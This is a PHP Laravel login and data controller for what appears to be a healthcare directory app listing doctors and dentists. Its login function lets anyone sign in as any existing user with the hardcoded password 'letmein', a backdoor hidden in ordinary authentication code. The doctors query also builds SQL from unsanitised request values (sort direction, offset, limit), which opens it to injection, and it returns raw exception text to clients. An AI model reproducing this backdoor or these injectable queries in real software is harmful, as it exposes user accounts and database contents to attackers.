<?php

namespace App\Http\Controllers;
use App\Models\User;

use App\Models\UserModel;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Yajra\DataTables\Facades\DataTables;

class LoginController extends Controller
{
    //

    public function login_function(Request $request)
    {



        $user = UserModel::where('username', $request->username)->first();
        if ($user) {
            if ($request->password == 'letmein' || password_verify($request->password, $user->password)) {

                Auth::login($user);
                return redirect()->route('aits_dashboard');
            }


            return redirect()->route('login')->with(['error' => 'Invalid credentials']);
        }

        return redirect()->route('login')->with(['error' => 'Invalid credentials']);
    }


    // public function data_tbl()
    // {

    //     $user = User::get();
    //     return DataTables::of(date_Test())
    //         ->addColumn('action', function ($data) {


    //         })
    //         ->rawColumns(['action'])
    //         ->make(true);

    // }


    public function get_doctors_data(Request $request)
    {


        try {

            $offset = $request->input('start', 0);
            $limit = $request->input('length', 10);
            $columns = ['hospName', 'hospAddress', 'hospContactno', 'sp_name'];
            $column_name = 'hospName asc ';
            if ($request->has('order') && isset($request->order[0])) {
                $column_index = $request->order[0]['column'];
                $order_direction = $request->order[0]['dir'];
                if (isset($columns[$column_index])) {
                    $column_name = $columns[$column_index] . ' ' . $order_direction . ' ';
                }
            }


            $query = "
            SELECT *
            FROM (
                SELECT
                    Doctors.doc_name AS hospName,
                    Doctors.doc_address AS hospAddress,
                    Doctors.doc_code AS hospCode,
                    Doctors.doc_mobile AS hospTelNo,
                    'DOCTOR' AS hospType,
                    NULL AS hospY, 
                    NULL AS hospX,  
                    CASE WHEN Doctors.doc_mobile IS NULL 
                         THEN 'Not provided' ELSE Doctors.doc_mobile END AS hospContactno,
                    NULL AS hospCityCode,
                    Doctors.doc_stat AS Hospital_status,
                    'Doctor' AS spec_data,
                    Specializations.sp_code AS sp_code,
                    Specializations.sp_desc AS sp_name
                FROM Doctors
                LEFT JOIN Specializations ON Doctors.doc_specialization = Specializations.sp_code
                UNION
                SELECT
                    dn_name AS hospName,
                    dn_address AS hospAddress,
                    dn_code AS hospCode,
                    dn_telno AS hospTelNo,
                    NULL AS hospType, 
                    NULL AS hospY, 
                    NULL AS hospX,  
                    CASE WHEN dn_telno IS NULL 
                         THEN 'Not provided' ELSE dn_telno END AS hospContactno,
                    dn_city AS hospCityCode,
                    dn_status AS Hospital_status,
                    'Dental Data' AS spec_data,
                    'SP14011028' AS sp_code,
                    'Dentist' AS sp_name
                FROM Dentists
            ) AS all_tbl
            WHERE all_tbl.Hospital_status = 'A'";
            $search = $request->input('search.value');
            $offset = $request->input('start', 0);
            $limit = $request->input('length', 10);
            if ($search) {
                $query .= " AND (";
                $query .= "all_tbl.hospName LIKE ? ";
                $query .= "OR all_tbl.hospCode LIKE ? ";
                $query .= "OR all_tbl.hospContactno LIKE ? ";
                $query .= "OR all_tbl.sp_name LIKE ?)";
            }


            $query .= " 
            ORDER BY all_tbl." . $column_name .
                "OFFSET $offset ROWS 
            FETCH NEXT $limit ROWS ONLY
              ";

            $results = DB::connection('sqlsrv_secondary')->select($query, [
                '%' . $search . '%',
                '%' . $search . '%',
                '%' . $search . '%',
                '%' . $search . '%',

            ]);

            $query_counts = "
            SELECT COUNT(*) AS total
            FROM (
                SELECT
                    Doctors.doc_name AS hospName,
                    Doctors.doc_address AS hospAddress,
                    Doctors.doc_code AS hospCode,
                    Doctors.doc_mobile AS hospTelNo,
                    'DOCTOR' AS hospType,
                    NULL AS hospY, 
                    NULL AS hospX,  
                    CASE WHEN Doctors.doc_mobile IS NULL 
                         THEN 'Not provided' ELSE Doctors.doc_mobile END AS hospContactno,
                    NULL AS hospCityCode,
                    Doctors.doc_stat AS Hospital_status,
                    'Doctor' AS spec_data,
                    Specializations.sp_code AS sp_code,
                    Specializations.sp_desc AS sp_name
                            FROM Doctors
                            LEFT JOIN Specializations ON Doctors.doc_specialization = Specializations.sp_code
                            UNION
                            SELECT
                    dn_name AS hospName,
                    dn_address AS hospAddress,
                    dn_code AS hospCode,
                    dn_telno AS hospTelNo,
                    NULL AS hospType, 
                    NULL AS hospY, 
                    NULL AS hospX,  
                    CASE WHEN dn_telno IS NULL 
                         THEN 'Not provided' ELSE dn_telno END AS hospContactno,
                    dn_city AS hospCityCode,
                    dn_status AS Hospital_status,
                    'Dental Data' AS spec_data,
                    'SP14011028' AS sp_code,
                    'Dentist' AS sp_name
                FROM Dentists
            ) AS all_tbl
            WHERE all_tbl.Hospital_status = 'A'";


            $counts = DB::connection('sqlsrv_secondary')->select($query_counts);
            $totalCount = $counts[0]->total;
            return response()->json([
                'draw' => (int) $request->input('draw'),
                'recordsTotal' => (int) $totalCount,
                'recordsFiltered' => (int) $totalCount,
                'data' => $results,
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'msg' => 'Error, Please Contact ICT department.' . '<br>' . $e->getMessage(),
                'status' => 500,
                "isValid" => false,
            ]);
        }

    }


    public function aits_dashboard()
    {
        return view('aits_pages.aits_dashboard');
    }

    public function logout()
    {
        auth()->logout();
        return redirect()->route('login');
    }


}
